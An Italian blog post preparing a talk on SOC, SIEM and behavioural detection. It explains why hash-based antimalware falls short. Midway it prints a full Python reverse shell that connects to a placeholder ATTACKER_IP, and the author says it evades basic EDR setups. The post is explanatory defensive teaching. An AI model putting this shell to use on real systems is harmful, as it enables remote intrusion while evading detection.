---
title: Preparazione del prossimo talk: SOC e SIEM
url: https://roccosicilia.com/2025/05/19/preparazione-del-prossimo-talk-soc-e-siem/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-21
fetch_date: 2025-10-06T22:29:16.548647
---

# Preparazione del prossimo talk: SOC e SIEM

# [Rocco Sicilia](https://roccosicilia.com)

Search

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.com/about/)
* [Divulgazione](https://roccosicilia.com/progetto-di-divulgazione/)
* [Sostieni il progetto](https://roccosicilia.com/sostieni-il-progetto/)
* [English version](https://medium.com/%40roccosicilia)

[cyber security](https://roccosicilia.com/category/cyber-security/), [ita](https://roccosicilia.com/category/ita/)

## [Preparazione del prossimo talk: SOC e SIEM](https://roccosicilia.com/2025/05/19/preparazione-del-prossimo-talk-soc-e-siem/)

Published by

Rocco Sicilia

on

[19 Maggio 2025](https://roccosicilia.com/2025/05/19/preparazione-del-prossimo-talk-soc-e-siem/)

Il 16 gennaio sono stato invitato a parlare di SOC e detection avanzata ad un evento locale in cui si parla di sicurezza e di NIS2. Il tema si lega in parte a quanto ho recentemente raccontato durante la sessione dedicata alla threat intelligence, o meglio, è un aspetto che ho sfiorato ed in questa occasione c’è modo di approfondirlo.

L’obiettivo è illustrare, ad una platea composta solo in parte figure tecniche, a cosa serve un SOC rispetto all’utilizzo di soluzioni di detection come EDR/XDR, SIEM, ecc. Quindi anche questo post, che sintetizza alcuni dei temi che ho deciso di trattare, si rivolge a figure non esperte. Tradotto: se sei un esperto di settore qui non ci trovi nulla di nuovo.

[![](https://roccosicilia.com/wp-content/uploads/2025/05/screenshot-2025-05-12-at-12.36.06.png?w=1024)](https://www.patreon.com/posts/live-session-04-125973712)

Live correlata: Threat Hunting

## Introduzione

In generale quando parlo di detection ritengo utile ricordare il paradigma con il quale il mondo della info. security si è sviluppato, paradigma che tuttora utilizziamo. Per dirla in modo molto semplice, lo sviluppo della sicurezza informatica si basa sullo studio delle minacce e della loro evoluzione: tutto ciò che implementiamo è una risposta ad una sollecitazione, ad una nuova tecnica di attacco, un nuovo tipo di minaccia che prima subiamo, poi comprendiamo ed infine impariamo a gestire. Ad ogni nostra nuova contromisura corrisponde, poco dopo, una evoluzione della minaccia stessa, ed il ciclo riparte.

## Advanced Threat Protection

L’evoluzione di ha portato “rapidamente” a considerare le minacce come una sequenza di eventi o comportamenti osservabili sui sistemi. Inizialmente, quando il mondo dell’information security era più semplice, la detection era basata su regole relativamente statiche: i malware erano intercettati grazie al fatto che si era in grado di riconoscere il file malevolo o componenti dello stesso. Aiutiamoci con un esempio: cosa succede se cerchiamo di eseguire il download di nc.exe (famigerato tool) su una workstation Windows con un anti malware attivo sul sistema?

![](https://roccosicilia.com/wp-content/uploads/2025/05/image.png?w=1024)

Notifica di Microsoft Defender in basso a destra.

I sistemi di protezione riconoscono il file e lo identificano come malware appena questo “si appoggia” sul disco e questo processo è praticamente istantaneo. Quello che è avvenuto è molto semplice: il sistema anti malware ha calcolato l’hash sha256 del file appena scaricato e lo ha confrontato con il proprio database di malware noti (ci sarebbe da fare un discorso a parte sul fatto che nc.exe sia considerato un malware, anzi dopo lo facciamo) ed ha quindi *deciso* di segnalare la presenza del file pericoloso e di rimuoverlo dal sistema.

![](https://roccosicilia.com/wp-content/uploads/2025/05/image-1.png?w=1024)

Verifica dell’hash tramite virustotal.

Questo metodo di detection, per quanto ancora estremamente usato ed utile, ha il problema di essere estremamente debole contro le minacce “moderne”: è sufficiente variare anche solo parzialmente il codice del malware per ottenere un hash differente mantenendo le funzionalità di base. L’utiliy in oggetto è spesso usata come base per costruirsi una reverse shell da una macchina target verso il sistema dell’attacker, un modo furbo di aggirare i limiti imposti dalla configurazione di rete e guadagnare un accesso remoto ad un sistema vittima. Se nc.exe e simili non sono utilizzabili (vengono considerati pericolosi proprio per questo) come possiamo ottenere lo stesso risultato senza essere bloccati dal sistema anti malware?

Tecnicamente parlando ci serve un tool che non sia noto e che sia in grado di aprire una sessione tcp dalla macchina vittima al sistema dell’attacker. È un problema che si risolve con poche righe di scripting con Powershell o Python (o quello che vi pare). Oggi, mentre scrivo questo post, anche Powershell è diventato un *sorvegliato speciale* e non è più così utilizzabile come un tempo (nel 2024 lo usavo abbastanza abitualmente per questo tipo di test), quindi ripieghiamo su Python per questo esempio. Ci serve uno script che apra una sessione tcp in cui indirizzare l’input/output della CLI:

```
import socket, subprocess, threading

def forward_input(sock, proc):
    while True:
        data = sock.recv(1024)
        if not data:
            break
        proc.stdin.write(data)
        proc.stdin.flush()

def forward_output(sock, proc):
    while True:
        output = proc.stdout.read(1)
        if not output:
            break
        sock.sendall(output)

sock = socket.socket()
sock.connect(("ATTACKER_IP", PORT))

proc = subprocess.Popen(
    ["cmd"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)

threading.Thread(target=forward_input, args=(sock, proc), daemon=True).start()
threading.Thread(target=forward_output, args=(sock, proc), daemon=True).start()

proc.wait()
sock.close()
```

Lo script che qui riporto è stato creato per l’occasione ed è una variante di un noto script usatissimo per aprirsi una reverse shell con python. È giusto segnalare che il noto script in questione viene spesso intercettato dagli EDR, questa variante no (per ora) o quanto meno non viene rilevato con una configurazione base. **Ed è questo il punto**: i software anti malware si sono dovuti rapidamente adattare alla presenza di minacce non riconoscibili dal banale hash del file o altri artefatti e si è arrivati ad osservare il comportamento di un determinato eseguibile, uno script o dell’utente.

L’idea alla base dell’*Advanced Threat Protection* è quindi quella di osservare i comportamenti (tutti) dei sistemi in rete, bloccare immediatamente ciò che si è in grado di riconoscere e generare almeno un allarme in caso di comportamenti sospetti, eventualmente scatenando una risposta grazie all’automazione o tramite l’azione di un team dedicato.

## Il mondo vero

Il vero problema è che *il mondo vero* è parecchio complesso e ci sono diversi strati/elementi che dobbiamo considerare.

![](https://roccosicilia.com/wp-content/uploads/2025/05/image-2.png?w=1024)

Una ipotetica rete

È sufficiente considerare le fasi di un tipico attacco strutturato per avere un’idea dei diversi punti di attenzione in questo processo e ragionare sui singoli step che caratterizzano l’azione di attacco.

#### Ricognizione

L’attaccante raccoglie informazioni sulla vittima (sistemi, dipendenti, e-mail, infrastrutture) usando diverse tecniche tra cui OSINT (Open Source Intelligence). Praticamente non esiste detection in quanto non è necessario un contatto diretto con i sistemi e l’unica cosa che possiamo fare è tanta tanta prevenzione cercando di ridurre il più possibile il nostro livello di esposizione. Nelle fasi in cui la ricognizione utilizza tecniche più rumorose le azioni possono diventare osservabili e anche i dati che il threat actor è in grado di elaborare diventano più precisi.

#### Weaponization

Se la ricognizione ha portato i suoi frutto, il threat actor sarà in grado di scegliere o costruire un’arma che sfrutti le nostre debolezze. È una fase preparatorio per il threat actor da cui noi possiamo solo imparare per capire come difenderli: meglio conosciamo le “armi” del nostro avversario ...